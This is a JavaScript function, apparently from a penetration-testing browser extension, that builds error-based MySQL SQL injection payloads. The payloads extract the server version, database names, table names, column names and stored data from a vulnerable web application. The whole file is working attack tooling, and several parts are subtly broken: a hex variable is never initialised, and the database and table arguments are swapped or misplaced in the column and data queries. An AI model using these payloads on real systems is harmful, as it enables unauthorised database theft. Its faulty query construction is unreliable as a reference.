function setErrorBased(id){
	var hex, string, db, tbl, cl = "";
	var i = 0;
	switch (id) {
		/*------GET VERSION------*/
		case "getversion":
			setSelectedText("+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1");
			break;

		/*------GET DATABASE------*/
		case "getdatabase":
			setSelectedText("+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)")
			break;

		/*------GET TABLES------*/
		case "gettables":
			getSelectedText(function(str) {
				for (i; i < str.length; i++) {
					hex += "" + str.charCodeAt(i).toString(16);
				}

				string = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + "0x" + hex + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";

				setSelectedText(string);
			});
			break;

		/*------GET COLUMNS------*/
		case "getcolumns":
			getSelectedText(function(str) {
				db = window.prompt("Get columns", "Name of the database");
				if (db == undefined) {} else {
					tbl = window.prompt("Get columns", "Name of the table");
				}

				if (tbl == undefined) {} else {
					var hexdb = "";
					var hextbl = "";

					for (i; i < db.length; i++) {
						hexdb += "" + db.charCodeAt(i).toString(16);
					}

					for (i = 0; i < tbl.length; i++) {
						hextbl += "" + tbl.charCodeAt(i).toString(16);
					}

					string = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=" + "0x" + hexdb + "+AND+table_schema=" + "0x" + hextbl + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";

					setSelectedText(string);
				}
			});
			break;

		/*------GET DATA------*/
		case "getdata":
			getSelectedText(function(str) {
				db = window.prompt("Get data", "Name of the database");

				if (db == undefined) {} else {
					tbl = window.prompt("Get data", "Name of the table");
				}
				if (tbl == undefined) {} else {
					cl = window.prompt("Get data", "Name of the column");
				}

				if (cl == undefined | db == undefined) {} else {
					string = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(" + db + ")+AS+CHAR),0x7e))+FROM+" + tbl + "." + cl + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";

					setSelectedText(string);
				}
			});
			break;
	}
}